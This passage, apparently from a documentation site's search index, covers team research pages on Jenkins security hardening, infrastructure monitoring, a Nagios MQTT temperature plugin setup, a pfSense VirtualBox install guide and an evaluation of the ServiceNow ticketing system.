that developers in the Jenkins community implement and expand with original code. Therefore, plugins are created by community developers in accordance with the functional requirements, and we can download those plugins to add that feature to Jenkins.  Here are some commonly used Jenkins plugins  ","version":"Next","tagName":"h2"},{"title":"Basic Jenkins security management​","type":1,"pageTitle":"Jenkins Automation Security","url":"/redback-documentation/docs/cybersecurity/research/jenkins-security#basic-jenkins-security-management","content":" From workstations on corporate intranets to powerful servers connected to the public internet, Jenkins is utilised everywhere. Jenkins provides a variety of configuration options for enabling, changing, or disabling various security elements to safely serve this vast range of security and threat profiles. Since Jenkins 2.0, numerous security features have been enabled by default to keep Jenkins environments secure unless a system administrator specifically turns off safeguards. When passing the interactive setup wizard, several of the security parameters are turned on by default to make sure Jenkins is secure. Others depend on specialised use cases enabled by unique Jenkins instances and include environment-specific installation and exchange.  Jenkins has two sections for access control:  Users authenticate themselves by demonstrating their identity utilising a security realm. User identification and group memberships are governed by the security domain.  An authorisation approach allows users to be authorised (permitted to perform something). This regulates whether a user has a permission (directly or via group memberships).  Jenkins Security, Authentication, Authorization, and Enabling Project Security Matrix is explained in this video tutorial.  ","version":"Next","tagName":"h2"},{"title":"Jenkins Security CVE​","type":1,"pageTitle":"Jenkins Automation Security","url":"/redback-documentation/docs/cybersecurity/research/jenkins-security#jenkins-security-cve","content":" These are the following latest Jenkins CVE including plugins (up to date):    To discover more in details, click here.  ","version":"Next","tagName":"h2"},{"title":"Jenkins Security recommendations​","type":1,"pageTitle":"Jenkins Automation Security","url":"/redback-documentation/docs/cybersecurity/research/jenkins-security#jenkins-security-recommendations","content":" Update Outdated and Vulnerable Core Plugins. Jenkins may be divided into two parts for the purpose of looking for known vulnerabilities: the basic automation platform of Jenkins and the plugins that sit on top of it. Maintaining a vulnerable version is particularly risky since malevolent users could employ publicly accessible exploits to take advantage of your server. While updating the core version requires manual labor, updating plugins only requires a few mouse clicks on the Jenkins UI. Most publicly disclosed vulnerabilities are plugin-related, so removing them will fix many security issues. Authentication and authorization. Jenkins offers numerous built-in authentication options, including &quot;Jenkins' user database&quot; and &quot;Delegate to servlet container&quot; (together referred to as &quot;Security Realms&quot; in Jenkins). Jenkins' built-in authentication mechanisms should not be used; instead, users should authenticate against a centralised third-party provider, such as GitLab, Github, LDAP, SAML, or Google. These techniques enable restrictions, such as password complexity, to be applied to the passwords, preventing unauthorised users from accessing the server. Jenkins has the built-in permission options &quot;Legacy mode,&quot; &quot;Anyone can do everything,&quot; and &quot;Logged-in users can do anything.&quot; Specialists advise against using these built-in techniques in favour of plugins for more sophisticated permission procedures. The two most well-known plugins for this purpose are Matrix Authorization Strategy and Role-based Authorization Strategy. These plugins offer significant flexibility for implementing PoLP (Principle of least privilege) by defining the privileges of anonymous users, authenticated users, or specified ones. Additionally, you can assign roles that you create for each user or set privileges for each project. It is also feasible to use GitHub-based and GitLab-based authentication (using previously mentioned plugins). Limiting Agent Privileges. Build pipelines will by default be operating under the SYSTEM internal user's permissions. As a result, builds can now start and stop other builds, create, and delete jobs, run code on any node, and do other operations. If, for instance, Jenkins draws malicious build pipelines from the SCM platform, which the Jenkins administrator doesn't monitor, running builds with such rights can lead to major security risks. You can specify which user will perform the build and, consequently, what permissions, by using the Authorize Project plugin. Setting the least privilege possible for each project would be the general rule of thumb    The use of containerized agents. The agents can be run using a variety of techniques and instructions, including Kubernetes clusters, virtual machines, containers, and physical machines. From a security standpoint, we aim to reduce the influence that a hacked build has on other builds or the system. As a result, we favor starting from scratch with each build environment. Creating a container image with all necessary dependencies and delivering the task to a distant docker service could do this. By doing that, you can be guaranteed that every build will run on a fresh, independent container. Security credentials. The Jenkins core application does not offer practical ways to limit the exposure of credentials for users and builds, but several well-liked plugins do so admirably. Every new credential that is introduced to Jenkins has two options: &quot;Global,&quot; which makes it available for Jenkins, nodes, items, all children's items, basically everything, or &quot;System,&quot; which limits access to Jenkins and nodes only. To manage and access credentials, you can also build &quot;Domains&quot; for them.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Jenkins Automation Security","url":"/redback-documentation/docs/cybersecurity/research/jenkins-security#conclusion","content":" An open-source automation tool called Jenkins is free to use and comes with built-in plugins for usage with continuous integration. Because it is used to build, compile, and test your product, developers can easily make changes to it. Jenkins is a server that allows any developer to build, test, and release software. It is a tool for automation. Software called Jenkins allows for continuous integration, so In order to solve the issue of discovering mistakes later in the construction process, automated deployment was developed. One of the most important stages in the software development life cycle is the deployment of an application or component to test servers and later to end users, which makes it possible for testing to take place. Jenkins plugin is a Java-archive package that while being produced follows a specified structure. Each plugin contains all the required information, such as files, graphics, code, and other specifics. Jenkins still has shortcomings such the lack of Rules and alternatives for authentication and authorisation, even with the highlighted capabilities. As a result, by putting security standards and regulations in place, potential restrictions could be lessened, and the application's effectiveness increased.  ","version":"Next","tagName":"h2"},{"title":"Reference list​","type":1,"pageTitle":"Jenkins Automation Security","url":"/redback-documentation/docs/cybersecurity/research/jenkins-security#reference-list","content":" H. Sheth, “What is Jenkins? how &amp; why to use it?,” LambdaTest, 02-Sep-2022. [Online]. Available: https://www.lambdatest.com/blog/what-is-jenkins/. [Accessed: 23-Nov-2022]. S. Ndungu, “Jenkins automation for high-quality builds: Blazemeter by perforce,” Blazemeter, 07-Feb-2022. [Online]. Available: https://www.blazemeter.com/blog/jenkins-automation. [Accessed: 23-Nov-2022]. B. Shrikanth, “Jenkins for test automation : Tutorial,” BrowserStack, 07-Sep-2022. [Online]. Available: https://www.browserstack.com/guide/jenkins-for-test-automation. [Accessed: 23-Nov-2022]. Jagrat, “Jenkins manage plugins - how to manage, update &amp; uninstall,” TOOLSQA, 11-Sep-2021. [Online]. Available: https://toolsqa.com/jenkins/jenkins-manage-plugins/. [Accessed: 23-Nov-2022]. E. Katz, “Top 25 jenkins plugins for 2021,” Spectral, 22-Dec-2020. [Online]. Available: https://spectralops.io/blog/top-25-jenkins-plugins-for-2021/. [Accessed: 23-Nov-2022]. “Jenkins security: Enabling security &amp; project security matrix,” Software Testing Help, 25-Oct-2022. [Online]. Available: https://www.softwaretestinghelp.com/jenkins-security-tutorial/. [Accessed: 23-Nov-2022]. “Jenkins Security Advisory 2022-06-22,” Jenkins security advisory 2022-06-22. [Online]. Available: https://www.jenkins.io/security/advisory/2022-06-22/. [Accessed: 23-Nov-2022]. A. Ilgayev, “Jenkins security best practices,” Cycode, 24-Aug-2022. [Online]. Available: https://cycode.com/blog/jenkins-security-best-practices/. [Accessed: 23-Nov-2022]. Jenkins Plugin for Fortify SCA (v 19.2). YouTube, 2019. [Online video]. Available: https://www.youtube.com/watch?v=9R6FZQu_jGc. [Accessed: 23-Nov-2022]. ","version":"Next","tagName":"h2"},{"title":"Major Areas of Redback to be Monitored","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/major-areas","content":"","keywords":"","version":"Next"},{"title":"Cloud Infrastructure:​","type":1,"pageTitle":"Major Areas of Redback to be Monitored","url":"/redback-documentation/docs/cybersecurity/research/major-areas#cloud-infrastructure","content":" Monitoring the performance, availability, and security of the cloud infrastructure, such as virtual machines, databases, and storage, is crucial to ensure smooth operations and data protection.  ","version":"Next","tagName":"h2"},{"title":"Application Performance:​","type":1,"pageTitle":"Major Areas of Redback to be Monitored","url":"/redback-documentation/docs/cybersecurity/research/major-areas#application-performance","content":" Monitoring the performance of Redback Operations' applications, including response times, error rates, and resource utilization, helps identify bottlenecks, optimize performance, and maintain a positive user experience.  ","version":"Next","tagName":"h2"},{"title":"Resource Usage and Cost:​","type":1,"pageTitle":"Major Areas of Redback to be Monitored","url":"/redback-documentation/docs/cybersecurity/research/major-areas#resource-usage-and-cost","content":" Keeping track of resource usage and associated costs is essential for budgeting and cost optimization. Monitoring resource utilization helps identify underused or overprovisioned resources and adjust allocations accordingly.  ","version":"Next","tagName":"h2"},{"title":"Security and Compliance:​","type":1,"pageTitle":"Major Areas of Redback to be Monitored","url":"/redback-documentation/docs/cybersecurity/research/major-areas#security-and-compliance","content":" Monitoring security events, vulnerabilities, and compliance with industry standards is vital to protect sensitive data and maintain regulatory compliance. This includes monitoring access controls, encryption, and authentication mechanisms.  ","version":"Next","tagName":"h2"},{"title":"Network Performance:​","type":1,"pageTitle":"Major Areas of Redback to be Monitored","url":"/redback-documentation/docs/cybersecurity/research/major-areas#network-performance","content":" Monitoring network latency, bandwidth, and traffic patterns helps ensure reliable communication between cloud services, applications, and users. Identifying and addressing network issues can prevent delays and improve overall performance.  ","version":"Next","tagName":"h2"},{"title":"Backup and Disaster Recovery:​","type":1,"pageTitle":"Major Areas of Redback to be Monitored","url":"/redback-documentation/docs/cybersecurity/research/major-areas#backup-and-disaster-recovery","content":" Monitoring backup processes and disaster recovery plans ensures data protection and business continuity. Regularly testing backups and recovery procedures helps maintain a robust disaster recovery strategy.  ","version":"Next","tagName":"h2"},{"title":"User Activity and Usage:​","type":1,"pageTitle":"Major Areas of Redback to be Monitored","url":"/redback-documentation/docs/cybersecurity/research/major-areas#user-activity-and-usage","content":" Monitoring user activity and usage patterns can help identify potential issues, optimize resource allocation, and improve the overall user experience. This includes monitoring user authentication, authorization, and access to resources.  ","version":"Next","tagName":"h2"},{"title":"System Updates and Patches:​","type":1,"pageTitle":"Major Areas of Redback to be Monitored","url":"/redback-documentation/docs/cybersecurity/research/major-areas#system-updates-and-patches","content":" Keeping track of system updates and patches is essential to maintain a secure and stable environment. Regularly applying updates and patches helps protect against known vulnerabilities and ensures optimal performance.  ","version":"Next","tagName":"h2"},{"title":"Conclusion:​","type":1,"pageTitle":"Major Areas of Redback to be Monitored","url":"/redback-documentation/docs/cybersecurity/research/major-areas#conclusion","content":" Monitoring these major areas will help Redback Operations maintain a secure, efficient, and cost-effective cloud infrastructure, ensuring smooth operations and a positive user experience. ","version":"Next","tagName":"h2"},{"title":"Redback - MQTT Temperature Plugin in Nagios","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/nagios/MQTT_Temperature_Plugin_Setup_Guide","content":"","keywords":"","version":"Next"},{"title":"Step 1: Install Required Dependencies​","type":1,"pageTitle":"Redback - MQTT Temperature Plugin in Nagios","url":"/redback-documentation/docs/cybersecurity/research/nagios/MQTT_Temperature_Plugin_Setup_Guide#step-1-install-required-dependencies","content":" Before configuring the plugin, ensure that all dependencies are installed on your Nagios server. The MQTT plugin may require Python or other libraries. You can install these dependencies by running the following command:  sudo apt-get install python3 python3-pip pip3 install paho-mqtt   ","version":"Next","tagName":"h2"},{"title":"Step 2: Configure commands.cfg​","type":1,"pageTitle":"Redback - MQTT Temperature Plugin in Nagios","url":"/redback-documentation/docs/cybersecurity/research/nagios/MQTT_Temperature_Plugin_Setup_Guide#step-2-configure-commandscfg","content":" You will need to define the command for the MQTT temperature plugin in the commands.cfg file.  Open the commands.cfg file: sudo nano /usr/local/nagios/etc/objects/commands.cfg Add the following command definition to the file: define command { command_name check-mqtt_temperature command_line /usr/local/nagios/libexec/check-mqtt_temperature.py -H $ARG1$ -t $ARG2$ } This defines the custom command that Nagios will use to check the temperature data from the MQTT broker. Save and exit the file.  ","version":"Next","tagName":"h2"},{"title":"Step 3: Configure localhost.cfg​","type":1,"pageTitle":"Redback - MQTT Temperature Plugin in Nagios","url":"/redback-documentation/docs/cybersecurity/research/nagios/MQTT_Temperature_Plugin_Setup_Guide#step-3-configure-localhostcfg","content":" Next, configure the service in the localhost.cfg file to enable monitoring using the temperature plugin.  Open the localhost.cfg file: sudo nano /usr/local/nagios/etc/objects/localhost.cfg Add the following service definition for the MQTT temperature plugin: define service { use generic-service host_name localhost service_description MQTT Temperature Check check_command check-mqtt_temperature!10.137.0.149!iot/device/temperature check_interval 1 retry_interval 1 contacts nagiosadmin notifications_enabled 1 notification_options w,u,c,r notification_interval 60 notification_period 24x7 } This service will run the MQTT temperature check every minute and notify the admin via email if abnormal conditions are detected.  ","version":"Next","tagName":"h2"},{"title":"Step 4: Configure Alerts and Notifications​","type":1,"pageTitle":"Redback - MQTT Temperature Plugin in Nagios","url":"/redback-documentation/docs/cybersecurity/research/nagios/MQTT_Temperature_Plugin_Setup_Guide#step-4-configure-alerts-and-notifications","content":" To ensure email notifications are sent when a temperature threshold is crossed, configure the email alerts in Nagios.  Install the necessary mail utilities: sudo apt-get install mailutils Configure the contact group and contact information: Open the contacts.cfg file: sudo nano /usr/local/nagios/etc/objects/contacts.cfg Add the following contact information: define contact { contact_name nagiosadmin alias Nagios Admin email youremail@email.com } define contactgroup { contactgroup_name admins alias Nagios Administrators members nagiosadmin } This configuration defines the recipient for the notification emails.  ","version":"Next","tagName":"h2"},{"title":"Step 5: Test Notifications​","type":1,"pageTitle":"Redback - MQTT Temperature Plugin in Nagios","url":"/redback-documentation/docs/cybersecurity/research/nagios/MQTT_Temperature_Plugin_Setup_Guide#step-5-test-notifications","content":" To verify that email notifications are functioning correctly, manually trigger an alert by simulating an abnormal condition, such as stopping the MQTT service or setting an unrealistic temperature value. Nagios will detect the condition and send an email to the configured address.  Check your email inbox to confirm that the alert was received. You should see a message similar to this:    Figure 1: Test E-mail  ","version":"Next","tagName":"h2"},{"title":"Step 6: Restart Nagios​","type":1,"pageTitle":"Redback - MQTT Temperature Plugin in Nagios","url":"/redback-documentation/docs/cybersecurity/research/nagios/MQTT_Temperature_Plugin_Setup_Guide#step-6-restart-nagios","content":" After configuring all necessary files, restart the Nagios service to apply the changes.  sudo systemctl restart nagios     This completes the setup of the MQTT temperature monitoring plugin in Nagios. You can now monitor IoT device temperatures and receive alerts when abnormal conditions are detected. ","version":"Next","tagName":"h2"},{"title":"How We Can Monitor Major Areas","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/major-areas-response","content":"","keywords":"","version":"Next"},{"title":"Cloud Infrastructure​","type":1,"pageTitle":"How We Can Monitor Major Areas","url":"/redback-documentation/docs/cybersecurity/research/major-areas-response#cloud-infrastructure","content":" To maintain the integrity of cloud infrastructure, all machines and accounts must be password protected, alongside the implementation of 2-Factor Authentication. Not only does this apply a second layer of security to the cloud infrastructure, but log-in attempts can be monitored and logged through the 2FA implementation, ensuring that the company can be made aware in the event of an infrastructural breach in the cloud department. This allows for quick responsiveness in the event of an emergency, thus working to protect sensitive information and network storage.  ","version":"Next","tagName":"h2"},{"title":"Application Performance​","type":1,"pageTitle":"How We Can Monitor Major Areas","url":"/redback-documentation/docs/cybersecurity/research/major-areas-response#application-performance","content":" A major way to monitor application performance is through user feedback and reviews. Only a user can provide a gauge as to whether the performance needs to be worked on and improved, and what specifically needs to be improved on. An active strive for positive user reviews can help aid this, by swiftly responding to negative and constructive user reviews to provide an adequate experience.  Aside from reviews, load testing can be done on the applications to test for internal performance limitations and scalability issues where server-side upgrades may need to take place if necessary.  Though ultimately, application performance can be monitored through the implementation of technical monitoring metrics, such as response time, error rates and total-resource usage. Application Performance Measurement (APM) solutions much be explored for an in-depth analysis of application performance.  ","version":"Next","tagName":"h2"},{"title":"Resource Usage and Cost​","type":1,"pageTitle":"How We Can Monitor Major Areas","url":"/redback-documentation/docs/cybersecurity/research/major-areas-response#resource-usage-and-cost","content":" To monitor resource usage, tools such as Datadog or Grafana can be utilized to monitor CPU usage, memory usage, disk activity and network traffic. This information can be used to dictate whether certain areas of operation are under heavy load, and appropriate measures can be taken to come to a solution.  Moreover, to monitor resource costs, budgeting practices must take place to ensure that our resources expenses are managed effectively. To do this, a cost-usage matrix should be created to assess whether it is worthwhile spending a certain amount of money on a resource that we may barely use. By doing so, we can cut out unnecessary resource costs, therefore optimizing our budget allocation.  ","version":"Next","tagName":"h2"},{"title":"Security and Compliance​","type":1,"pageTitle":"How We Can Monitor Major Areas","url":"/redback-documentation/docs/cybersecurity/research/major-areas-response#security-and-compliance","content":" Not only do we need to adhere to industry standards, but regular checks on full compliance policies need to take place to ensure that these standards are adhered to. This can be monitored through regular risk assessments based on an already defined risk matrix, documenting and reporting any changes and how they were assessed/put in place. All relevant employees must be briefed and trained so they are aware of all security and compliance measures, so they are not compromised at any time. Though these compliance policies and contingency plans must be easily accessible for all staff members in the event of a compliance breach.  ","version":"Next","tagName":"h2"},{"title":"Network Performance​","type":1,"pageTitle":"How We Can Monitor Major Areas","url":"/redback-documentation/docs/cybersecurity/research/major-areas-response#network-performance","content":" To monitor network performance, real-time bandwidth measurements should regularly be taken to identify if the network is under high load. Applications like Wireshark can then be utilized to investigate network traffic and its impact on performance. This allows the networking team to analyze network traffic in real-time, identifying which connections require additional bandwidth.  Additionally, automated alerts can be set up to send a message to our networking team when there are networking issues, allowing them to identify where the network is underperforming and how to adjust accordingly.  ","version":"Next","tagName":"h2"},{"title":"Backup and Disaster Recovery.​","type":1,"pageTitle":"How We Can Monitor Major Areas","url":"/redback-documentation/docs/cybersecurity/research/major-areas-response#backup-and-disaster-recovery","content":" Backup and Disaster recovery can be implemented and monitored through the administration of an automated storage backup program – such as “Microsoft Azure Backup” (though we may need to switch from GCP first), or Veritas NetBackup, which offers automated storage backups for both, on-site and off-site storage.  These storage logs should be regularly reviewed to ensure that all required information is stored safely, and incident response plans should be put in place in the event of the need for Disaster Recovery.  ","version":"Next","tagName":"h2"},{"title":"User Activity and Usage​","type":1,"pageTitle":"How We Can Monitor Major Areas","url":"/redback-documentation/docs/cybersecurity/research/major-areas-response#user-activity-and-usage","content":" To monitor user activity and usage, logging mechanisms should be implemented to verify and record user authentication events. These logs will include information such as login attempts (both successful and unsuccessful). This allows the team to determine when an individual is connected to the network, therefore monitoring their usage.  To better monitor activity and usage, Redback Operations can investigate implementing SIEMs to better record activity on devices, servers, applications, and security measures (such as firewalls) in the form of logs.  Moreover, regular audits can take place, reviewing the usage of users (recorded by the logging systems previously explained). This can be used to identify how users navigate the system, what they access and what they have access to, allowing for appropriate changes to be made if required.  ","version":"Next","tagName":"h2"},{"title":"System Updates and Patches​","type":1,"pageTitle":"How We Can Monitor Major Areas","url":"/redback-documentation/docs/cybersecurity/research/major-areas-response#system-updates-and-patches","content":" To monitor system updates and patches, patch management software, such as “Windows Server Update Services” or “System Center Configuration Manager” can be utilized to automatically patch and update the Redback Operations servers and systems to actively patch any bugs or exploits. In tandem with this, automatic updates will be provided when a new patch or update is available.  Additionally, the implementation of tools such as “Nessus” or “OpenVAS” can be used to regularly scan for vulnerabilities in the system and server. These scans can then be logged and reported and accurately responded to via a previously explained patch management software.  Finally, we can establish a monitoring/reporting system to track the deployment of patches, allowing us to maintain compliance with security protocols and actively respond to any issues that may arise in the patch deployment phase. ","version":"Next","tagName":"h2"},{"title":"pFsense Install Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/pFsense-install-guide","content":"","keywords":"","version":"Next"},{"title":"Abstract​","type":1,"pageTitle":"pFsense Install Guide","url":"/redback-documentation/docs/cybersecurity/research/pFsense-install-guide#abstract","content":" This document's goal is to show how to create an effective and secure firewall/router using pFsense in a virtual environment that is useful for various testing purposes. This guide shows how to set up a LAN and WAN network interface, configure pFsense, and how to connect another VM to pFsense LAN.  ","version":"Next","tagName":"h2"},{"title":"Prerequisites​","type":1,"pageTitle":"pFsense Install Guide","url":"/redback-documentation/docs/cybersecurity/research/pFsense-install-guide#prerequisites","content":" In order to run a virtual machine, you will first need to enable virtualization. You can see if it's enabled by going to Task Manager -&gt; Performance -&gt; CPU. Then at the bottom, check if Virtualization is enabled.    If it's not enabled, you’ll need to go into your BIOS by pressing F12, F10, DEL or ESCAPE during start up.  Go to the Advanced tab -&gt; CPU Configuration, if you are using an Intel CPU enable Intel Virtualization Technology and if you are using AMD enable AMD-V. Once completed save and exit to restart your PC.  The minimum hardware specifications for a Windows 10 VM are:  A modern x86 Processor No less than 4GB of memory At least 20GB of free storage  ","version":"Next","tagName":"h3"},{"title":"1. Download pFsense and VirtualBox​","type":1,"pageTitle":"pFsense Install Guide","url":"/redback-documentation/docs/cybersecurity/research/pFsense-install-guide#1-download-pfsense-and-virtualbox","content":" Download pFsense from their website, make sure you down their latest version. After successfully downloading pFsense 2.7.2 ISO, make sure you extract it using 7Zip. Then download the latest version of Oracle VirtualBox, or your choice of VM software of choice. This guide we will be using VirtualBox.  ","version":"Next","tagName":"h3"},{"title":"2. Creating a New VM​","type":1,"pageTitle":"pFsense Install Guide","url":"/redback-documentation/docs/cybersecurity/research/pFsense-install-guide#2-creating-a-new-vm","content":" click on New in top right of VirtualBox.    Now configure the following settings in the create virtual machine wizard.  Under Name and Operating System tab:    Give your pFsense VM a name and locate the iso image for pFsense. It may be in your downloads folder if you cannot locate it.Type will be BSD and FreeBSD (64-bit) as the version.Uncheck Skip Unattended Installation  The minimum hardware requirements for pFsense:  memory = 1GBprocessors = 1CPUStorage = 8GB  Recommeded settings:  2GB of memory.One processor is completely fine15GB of storage will suffice  You can change your hardware settings at a later date, so if you need more processors or memory, you can add more.  Once completed, click on Finish  ","version":"Next","tagName":"h3"},{"title":"3. Configuring the network interfaces​","type":1,"pageTitle":"pFsense Install Guide","url":"/redback-documentation/docs/cybersecurity/research/pFsense-install-guide#3-configuring-the-network-interfaces","content":" In the top right click Settings -&gt; Network  Set Adapter 1 to NAT. This will be your WAN for your internet connectionClick Adapter 2, tick Enable Network Adapter, in the Attached To drop down box select Internal Network. This will be your LANClick Ok to save the settings.  ","version":"Next","tagName":"h3"},{"title":"4. Installation process for pFsense​","type":1,"pageTitle":"pFsense Install Guide","url":"/redback-documentation/docs/cybersecurity/research/pFsense-install-guide#4-installation-process-for-pfsense","content":" Select pFsense VM and click Start  Read carefully and Accept the installers copyright noticeSelect the first option Install, highlight ok and press enterSelect Auto (ZFS) highlight ok and press enter.Note: ZFS does tend to take up more memory, and is slightly faster, so if you are running on minimum specs, you can choose Auto (UFS), although a power outage can cause corruption if you are using UFS.For Configuration Options page leave the settings as default, highlight select and press enterChoose the first option Stripe, highlight ok and press enterPress spacebar to select your VirtualBox hard disk, highlight ok and press enter    Select Yes and press enter to destroy the current contents on your hard disk, this will start the install process, you wont be able to go back, so make sure all the settings are correct before moving forward.Once the install is completed you will be prompted to reboot. BEFORE you do this, you need to unmount your iso for pFsense, if you fail to do this you will have to restart to step one.In the top left click Device -&gt; Optical Drives -&gt; Select your ISO file for pFsense -&gt; Select Force Unmount -&gt; Now select Reboot in your pFsense VM -&gt; Type ExitTurn on your pFsense VM, your home page should look similar to this image.    Note: your WAN and LAN IP addresses may be different to the image above, that is fine.  ","version":"Next","tagName":"h3"},{"title":"5. Connecting another windows VM to pFsense​","type":1,"pageTitle":"pFsense Install Guide","url":"/redback-documentation/docs/cybersecurity/research/pFsense-install-guide#5-connecting-another-windows-vm-to-pfsense","content":" Download a Windows 10 VM (or any VM OS of your choice). You can find the ISO HereWhen creating Widows 10 VM, Type = Microsoft Windows, Version = Windows 10 (64-bit)Recommended requirements for windows 10 VM:  Memory = 4GBProcessors = 2 CPUsStorage = 20GB  Once you downloaded windows 10 VM select the Settings option then go to the Network panel. Select the Settings option -&gt; NetworkChange Adapter 1 to Internal Network so your vm can connect to your LanTurn on your Windows 10 VM, select Yes to network discoverability.    If done correctly your pFsense network will be automatically connected. If you do not have network discoverability on, you can navigate to Control Panel -&gt; Network and Internet -&gt; Network and Sharing Center -&gt; Advanced Sharing Setting Then turn on Network Discovery.  Type your pFsense LAN IP address into your browser. If all steps are done correctly, you should see this in your browser.    Username: adminPassword: pfsense  Now you have successfully installed pFsense to your virtual network.  ","version":"Next","tagName":"h3"},{"title":"6. Troubleshooting​","type":1,"pageTitle":"pFsense Install Guide","url":"/redback-documentation/docs/cybersecurity/research/pFsense-install-guide#6-troubleshooting","content":" If you have issues with installing pFsense iso due to Negate, you can also install the latest version without NetGate from here:Link  If you get this error at part 4 step 8, click Machine -&gt; Reset  vm_fault: page read error, pid 1 (init) vm_fault: page read error, pid 1 (init) vm_fault: page read error, pid 1 (init) vm_fault: page read error, pid 1 (init)   If you are facing other issues that are not here, you can find more troubleshooting guides using NetGate Docs:Netgate Docs ","version":"Next","tagName":"h3"},{"title":"Evaluation of ServiceNow (SNOW) Ticketing System","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/Servicesnow/","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Evaluation of ServiceNow (SNOW) Ticketing System","url":"/redback-documentation/docs/cybersecurity/research/Servicesnow/#1-introduction","content":" This report aims to evaluate the viability of the ServiceNow (SNOW) ticketing system for our team project. This evaluation includes an in-depth analysis of ServiceNow’s features, a comparative analysis with Redmine, a detailed integration strategy with our existing system, and user feedback and case studies. The final section provides a recommendation based on the findings.    ","version":"Next","tagName":"h2"},{"title":"2. Features of ServiceNow​","type":1,"pageTitle":"Evaluation of ServiceNow (SNOW) Ticketing System","url":"/redback-documentation/docs/cybersecurity/research/Servicesnow/#2-features-of-servicenow","content":" ServiceNow (SNOW) is a leading IT service management (ITSM) platform that offers a range of features designed to improve IT operations. Key features include:  Incident and Problem Management: ServiceNow automates the identification, logging, categorization, prioritization, and resolution of incidents and problems. AI is used to predict incidents before they occur and provides root cause analysis.Service Catalog and Self-Service Portal: Centralized repository for services that allows users to browse and request services efficiently. Self-Service Portal empowers users to submit and track tickets.Automated Workflows and AI Integration: Workflow automation streamlines repetitive tasks, allowing IT personnel to focus on more complex issues. AI-driven automation handles tasks like ticket routing and escalation.  ","version":"Next","tagName":"h2"},{"title":"3. Comparison with its competitors​","type":1,"pageTitle":"Evaluation of ServiceNow (SNOW) Ticketing System","url":"/redback-documentation/docs/cybersecurity/research/Servicesnow/#3-comparison-with-its-competitors","content":" ServiceNow is compared with its competitors, Synergy and Zendesk:  Integration Capabilities: ServiceNow: Extensive integration capabilities through REST APIs, allowing connections with third-party apps and services.Synergy: Offers solid integration options but may require middleware for complex systems.Zendesk: Strong integration with customer support and CRM but limited in broader IT contexts. Customization Options: ServiceNow: Robust customization enabling tailored workflows, user interfaces, and reporting.Synergy: Offers reasonable customization, though less flexible compared to ServiceNow.Zendesk: Focuses on customer support, less customization for IT service management. Scalability and Performance: ServiceNow: Optimized for large-scale environments, offering strong scalability and performance.Synergy: Suited for SMEs, performance issues may arise in large environments.Zendesk: Scales well for customer support, but its performance in IT contexts may not match ServiceNow.  ","version":"Next","tagName":"h2"},{"title":"4. Integration with Our System​","type":1,"pageTitle":"Evaluation of ServiceNow (SNOW) Ticketing System","url":"/redback-documentation/docs/cybersecurity/research/Servicesnow/#4-integration-with-our-system","content":" Steps for Integration:  Comprehensive Infrastructure Assessment: Identify current IT components and evaluate their compatibility with ServiceNow.Integration Points Identification: Map data flow between ServiceNow and other applications.Challenges and Requirements Analysis: Address challenges like data inconsistencies, security concerns, and user adoption resistance.Integration Plan Development: Define scope, objectives, and limitations.Resource Allocation: Assign personnel, budget, and technical assets.Risk Assessment and Mitigation: Identify potential risks and develop strategies to mitigate them.    ","version":"Next","tagName":"h2"},{"title":"5. User Feedback and Case Studies​","type":1,"pageTitle":"Evaluation of ServiceNow (SNOW) Ticketing System","url":"/redback-documentation/docs/cybersecurity/research/Servicesnow/#5-user-feedback-and-case-studies","content":" ","version":"Next","tagName":"h2"},{"title":"User Feedback:​","type":1,"pageTitle":"Evaluation of ServiceNow (SNOW) Ticketing System","url":"/redback-documentation/docs/cybersecurity/research/Servicesnow/#user-feedback","content":" Positive: Extensive functionality, particularly incident management and automation. AI-driven insights enhance operational efficiency.Negative: Complex initial setup and steep learning curve. High cost may be a concern for smaller organizations.  ","version":"Next","tagName":"h3"},{"title":"Case Studies:​","type":1,"pageTitle":"Evaluation of ServiceNow (SNOW) Ticketing System","url":"/redback-documentation/docs/cybersecurity/research/Servicesnow/#case-studies","content":" Company A: Reduced incident resolution time by 40% using AI-driven automation.Company B: Improved change management processes, minimizing downtime.Company C: Enhanced self-service options, resulting in a 30% decrease in support tickets.  ","version":"Next","tagName":"h3"},{"title":"6. Recommendation​","type":1,"pageTitle":"Evaluation of ServiceNow (SNOW) Ticketing System","url":"/redback-documentation/docs/cybersecurity/research/Servicesnow/#6-recommendation","content":" Based on the evaluation, ServiceNow is recommended as a robust and scalable ticketing system. While the initial setup and user interface present challenges, these can be mitigated through planning, training, and customization.  Final Rating: 8.5/10  Breakdown of the Final Rating: Features (Incident management, AI-driven automation): 3.0Scalability and customization: 2.5User experience: 1.5Cost: 1.0User feedback and case studies: 0.5  ","version":"Next","tagName":"h2"},{"title":"7. Conclusion​","type":1,"pageTitle":"Evaluation of ServiceNow (SNOW) Ticketing System","url":"/redback-documentation/docs/cybersecurity/research/Servicesnow/#7-conclusion","content":" ServiceNow offers a comprehensive suite of features that can significantly enhance IT service management processes. The long-term benefits in terms of efficiency and automation outweigh the challenges. Proper planning, configuration, and user training are recommended to maximize its potential.  ServiceNow Official Documentation Link to Guide  ","version":"Next","tagName":"h2"},{"title":"References​","type":1,"pageTitle":"Evaluation of ServiceNow (SNOW) Ticketing System","url":"/redback-documentation/docs/cybersecurity/research/Servicesnow/#references","content":" Brown, M. (2022). Case Study: Improving Incident Resolution with ServiceNow. Retrieved from ServiceNow Customers.Davis, K. (2023). Case Study: Streamlining Change Management with ServiceNow. Retrieved from ServiceNow Customers.Johnson, A. (2023). User Reviews of ServiceNow. Retrieved from G2 Reviews.Smith, J. (2022). Comprehensive IT Service Management Solution. Retrieved from ServiceNow Docs.Thompson, L. (2023). ServiceNow: Enhancing IT Operations with AI and Automation. Retrieved from Capterra.Wilson, P. (2023). Case Study: Enhancing Self-Service with ServiceNow Knowledge Management. Retrieved from ServiceNow Customers. ","version":"Next","tagName":"h2"},{"title":"pFsense Configuration Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/pFsense-configuration","content":"","keywords":"","version":"Next"},{"title":"Abstract​","type":1,"pageTitle":"pFsense Configuration 